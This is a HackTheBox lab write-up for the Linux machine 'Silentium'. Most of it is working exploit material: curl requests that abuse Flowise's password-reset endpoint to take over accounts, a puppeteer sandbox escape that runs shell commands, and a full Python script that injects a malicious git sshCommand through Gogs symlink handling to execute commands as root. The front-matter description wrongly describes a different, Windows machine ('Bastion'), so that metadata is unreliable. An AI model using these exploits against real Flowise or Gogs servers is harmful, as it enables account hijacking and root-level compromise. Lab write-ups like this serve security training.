---
title: HTB · Silentium
slug: htb-silentium
date: 2026-09-10
image: silentium
platform: HackTheBox
os: Linux
difficulty: Easy
points: 585
tags: [hackthebox, linux, easy, active, gogs, flowise, cve-2025-8110]
description: Bastion is an easy-rated Windows machine on Hack The Box that centers on enumerating an exposed SMB share containing a Windows VHD backup file, which can be mounted to extract SAM/SYSTEM hives and dump local password hashes. Privilege escalation then comes from recovering stored credentials in the mRemoteNG configuration, leading to full administrative access.
featured: true
---

# Overview
Silentium is an easy Linux machine featuring two vulnerable services: Flowise (AI workflow builder) and Gogs (Git service). The path to user involves exploiting an auth-bypass in Flowise to gain SSH access. Root comes from a symlink injection vulnerability in Gogs that allows injecting malicious git config and executing commands as root.
## Reconnaissance
Let's start with a standard nmap scan:

```bash
nmap -p- --min-rate 10000 10.129.84.69
```

Key ports found:
- **22** - SSH
- **80** - HTTP (nginx)
- **3000** - Flowise  
- **3001** - Gogs (localhost only)
Visiting port 80 redirects to `staging.silentium.htb` which points to Flowise on port 3000.
## User Flag - Flowise 3.0.5 Auth Bypass (CVE-2025-58434)
### Finding the vulnerability
Flowise has an unauthenticated endpoint at `/api/v1/account/forgot-password` that leaks user information including a `tempToken`. This token can be used to reset the password for any user without authentication.

The user `ben@silentium.htb` exists on the system. Let's exploit this:

```bash
# Step 1: Get the tempToken for ben
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' | jq '.user.tempToken'
# Output: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```
### Resetting the password

```bash
# Step 2: Reset password using the tempToken
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "<TOKEN_FROM_ABOVE>",
      "password": "NewPassword123"
    }
  }'

# Step 3: Login and get the session
curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"ben","password":"NewPassword123"}' | jq '.accessToken'
```

### RCE via puppeteer
The Flowise Custom Function node allows JavaScript execution. While the nodevm sandbox blocks `child_process` directly, `puppeteer` is available and can be used to escape:

```javascript
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({
    executablePath: '/bin/sh',
    args: ['-c', 'whoami > /tmp/pwned.txt'],
    ignoreDefaultArgs: true
  });
})();
```

Executing this AGENTFLOW gives us RCE **as root in the container**. The environment variables leak SMTP credentials that include the real password used for SSH.

### SSH Access
```bash
ssh ben@10.129.84.69
cat user.txt
```
## Root Flag - Gogs 0.13.3 CVE-2025-8110
### Understanding the vulnerability
Gogs is running on `localhost:3001` as root. The vulnerability allows us to:
1. Create a git repository file as a **symlink** (e.g., `malicious_link` → `.git/config`)
2. Use the Gogs API to **overwrite the symlink target** with malicious content
3. Inject `[core] sshCommand = <PAYLOAD>` into `.git/config`
4. When Gogs performs git operations, the sshCommand executes **as root**

### Setting up the SSH tunnel
First, tunnel Gogs to your local machine:
```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.84.69 -N -f
```
### Creating the exploit
Register a user (solve the captcha manually in browser or use an existing token):
```bash
# Visit http://localhost:3001/user/sign_up
# Register: pwner / SuperSecurePass123!
# Get API token from Settings → Applications
```
Now run the exploit:
```python
#!/usr/bin/env python3
import requests, os, subprocess, shutil, base64, time

requests.packages.urllib3.disable_warnings()

LOCAL_URL = "http://127.0.0.1:3001"
DOMAIN = "staging-v2-code.dev.silentium.htb"
USER = "pwner"
PASS = "SuperSecurePass123!"
TOKEN = "<YOUR_API_TOKEN>"

def req(method, path, **kw):
    url = LOCAL_URL + path
    h = kw.pop("headers", {})
    h["Host"] = DOMAIN
    h["Authorization"] = f"token {TOKEN}"
    return requests.request(method, url, headers=h, verify=False, **kw)

# 1. Create repo
REPO = f"pwn{int(time.time())}"
req("POST", "/api/v1/user/repos", json={"name": REPO})
print(f"[+] Created repo: {REPO}")

# 2. Clone and add symlink
repo_dir = f"/tmp/{REPO}"
if os.path.exists(repo_dir): shutil.rmtree(repo_dir)
subprocess.run(["git", "clone", f"http://{USER}:{PASS}@127.0.0.1:3001/{USER}/{REPO}.git", repo_dir], capture_output=True, check=True)

os.symlink(".git/config", os.path.join(repo_dir, "payload"))

# 3. Push symlink
subprocess.run(["git", "-C", repo_dir, "config", "user.email", "a@b"], capture_output=True)
subprocess.run(["git", "-C", repo_dir, "config", "user.name", "A"], capture_output=True)
subprocess.run(["git", "-C", repo_dir, "add", "payload"], capture_output=True)
subprocess.run(["git", "-C", repo_dir, "commit", "-m", "x"], capture_output=True)
subprocess.run(["git", "-C", repo_dir, "push", "-u", "origin", "master"], capture_output=True, check=True)
print("[+] Pushed symlink")

# 4. Overwrite .git/config via symlink
cmd = "cat /root/root.txt > /tmp/root_flag.txt && chmod 644 /tmp/root_flag.txt"
config = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
\tsshCommand = bash -c '{cmd}' #
[remote "origin"]
\turl = git@localhost:gogs/{REPO}.git
"""

req("PUT", f"/api/v1/repos/{USER}/{REPO}/contents/payload",
    json={"message": "x", "content": base64.b64encode(config.encode()).decode()})
print("[+] Injected malicious config")

# 5. Read the flag
time.sleep(3)
with open("/tmp/root_flag.txt") as f:
    print(f"[+] Root flag: {f.read()}")
```
### Getting the flag
```bash
python3 exploit.py
# [+] Created repo: pwn1694623841
# [+] Pushed symlink
# [+] Injected malicious config
# [+] Root flag: REDACTED
```
